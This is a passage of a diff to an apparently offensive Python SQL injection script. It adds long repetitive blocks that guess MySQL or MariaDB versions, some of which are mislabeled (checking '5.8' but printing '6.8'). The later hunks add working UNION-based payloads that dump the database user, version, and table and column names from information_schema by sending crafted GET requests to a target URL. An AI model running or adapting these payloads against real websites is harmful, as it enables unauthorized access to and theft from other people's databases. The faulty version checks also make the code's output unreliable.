+                                            print("web server operating version : MySQL >= 5.4 ")
+                                          if "5.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.5 ")
+                                          if "5.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.6")
+                                          if "5.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.9 ")
+                                          if "5.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.10 ")
+                                          if "6.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.0 ")
+                                          if "6.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.1 ")
+                                          if "6.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.2 ")
+                                          if "6.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.3 ")
+                                          if "6.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.4 ")
+                                          if "6.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.5 ")
+                                          if "6.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.6 ")
+                                          if "6.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.9 ")
+                                          if "6.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.10 ")
+                                          if "7.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.0 ")
+                                          if "7.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.1 ")
+                                          if "7.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.2 ")
+                                          if "7.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.3 ")
+                                          if "7.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.4  ")
+                                          if "7.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.5  ")
+                                          if "7.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.6 ")
+                                          if "7.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.7  ")
+                                          if "7.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.8  ")
+                                          if "7.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.9  ")
+                                          if "7.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.10  ")
+                                          if "8.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >=  8.0")
+                                          if "8.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.1 ")
+                                          if "8.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.2 ")
+                                          if "8.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.3")
+                                          if "8.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.4 ")
+                                          if "8.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.5 ")
+                                          if "8.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.6 ")
+                                          if "8.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.7 ")
+                                          if "8.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.8 ")
+                                          if "8.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.9 ")
+                                          if "8.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.10 ")
+                                          if "9.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.1 ")
+                                          if "9.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.2 ")
+                                          if "9.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.3 ")
+                                          if "9.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.4 ")
+                                          if "9.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.5 ")
+                                          if "9.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.6 ")
+                                          if "9.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.7 ")
+                                          if "9.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.8 ")
+                                          if "9.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.9 ")
+                                          if "9.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.10 ")
+                                          if "10.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.0 ")
+                                          if "10.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.1 ")
+                                          if "10.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.2 ")
+                                          if "10.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.3 ")
+                                          if "10.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.4 ")
+                                          if "10.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.5 ")
+                                          if "10.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.6 ")
+                                          if "10.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.7 ")
+                                          if "10.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.8 ")
+                                          if "10.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.9 ")
+                                          if "10.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.10 ")
+                                          if "11.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.0 ")
+                                          if "11.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.1 ")
+                                          if "11.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.2 ")
+                                          if "11.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.3 ")
+                                          if "11.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.4 ")
+
                                         if "MariaDB" in results_get_ver.text:
-                                            print("web server operating system : MariaDB")
+                                          print("web server operating system : Linux MariaDB")
+                                          if "5.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0")
+                                          if "5.0.12" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.0.12 ")
+                                          if "5.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.1 ")
+                                          if "5.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.2 ")
+                                          if "5.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.3 ")
+                                          if "5.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.4 ")
+                                          if "5.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.5 ")
+                                          if "5.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.6")
+                                          if "5.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.9 ")
+                                          if "5.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 5.10 ")
+                                          if "6.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.0 ")
+                                          if "6.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.1 ")
+                                          if "6.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.2 ")
+                                          if "6.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.3 ")
+                                          if "6.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.4 ")
+                                          if "6.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.5 ")
+                                          if "6.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.6 ")
+                                          if "6.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.7 ")
+                                          if "5.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.8 ")
+                                          if "5.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.9 ")
+                                          if "6.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 6.10 ")
+                                          if "7.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.0 ")
+                                          if "7.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.1 ")
+                                          if "7.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.2 ")
+                                          if "7.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.3 ")
+                                          if "7.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.4  ")
+                                          if "7.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.5  ")
+                                          if "7.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.6 ")
+                                          if "7.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.7  ")
+                                          if "7.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.8  ")
+                                          if "7.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.9  ")
+                                          if "7.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 7.10  ")
+                                          if "8.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >=  8.0")
+                                          if "8.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.1 ")
+                                          if "8.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.2 ")
+                                          if "8.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.3")
+                                          if "8.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.4 ")
+                                          if "8.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.5 ")
+                                          if "8.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.6 ")
+                                          if "8.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.7 ")
+                                          if "8.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.8 ")
+                                          if "8.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.9 ")
+                                          if "8.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 8.10 ")
+                                          if "9.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.1 ")
+                                          if "9.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.2 ")
+                                          if "9.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.3 ")
+                                          if "9.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.4 ")
+                                          if "9.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.5 ")
+                                          if "9.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.6 ")
+                                          if "9.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.7 ")
+                                          if "9.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.8 ")
+                                          if "9.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.9 ")
+                                          if "9.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 9.10 ")
+                                          if "10.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.0 ")
+                                          if "10.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.1 ")
+                                          if "10.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.2 ")
+                                          if "10.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.3 ")
+                                          if "10.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.4 ")
+                                          if "10.5" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.5 ")
+                                          if "10.6" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.6 ")
+                                          if "10.7" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.7 ")
+                                          if "10.8" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.8 ")
+                                          if "10.9" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.9 ")
+                                          if "10.10" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 10.10 ")
+                                          if "11.0" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.0 ")
+                                          if "11.1" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.1 ")
+                                          if "11.2" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.2 ")
+                                          if "11.3" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.3 ")
+                                          if "11.4" in results_get_ver.text:
+                                            print("web server operating version : MySQL >= 11.4 ")
 
                                         print("[INFO] Starting Enumerate table name DBMS...")
                                         payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
@@ -337,7 +1209,7 @@ if target_url:
                                         html_cont = results_get_queries.text
                                         dbms = r"\b\w+::\b\w+::\b"
                                         database_all = re.findall(dbms, html_cont)
-                                        print("Blind table name")
+                                        print("Blind tables name")
                                         print("Dump DBS : {}".format(dbs))
                                         print("------------------")
                                         print("| table | column |")
@@ -351,8 +1223,22 @@ if target_url:
                                         dbms = r"\b\w+::\b\w+::\b"
                                         database_all = re.findall(dbms, html_cont)
                                         print("")
-                                        print("Blind table name")
+                                        print("Blind columns name")
                                         print("Dump DBS : information_schema")
+                                        print("------------------")
+                                        print("| table | column |")
+                                        print("------------------")
+                                        for database in database_all:
+                                            print("+", database)
+                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
+                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
+                                        results_get_queries = requests.get(target_url + rm)
+                                        html_cont = results_get_queries.text
+                                        dbms = r"\b\w+::\b\w+::\b"
+                                        database_all = re.findall(dbms, html_cont)
+                                        print("")
+                                        print("Blind ALL table name")
+                                        print("Dump DBS : ALL")
                                         print("------------------")
                                         print("| table | column |")
                                         print("------------------")
@@ -360,7 +1246,7 @@ if target_url:
                                             print("+", database)
                                         exit()
                                     else:
-                                        print("[INFO] Testing Count Columns Founds : {}".format(num_countss))
+                                        print("[INFO] Testing Count Columns : {}".format(num_countss))
         
             else:
                 print("[WARNING] Target Injection Failed (this on line)")
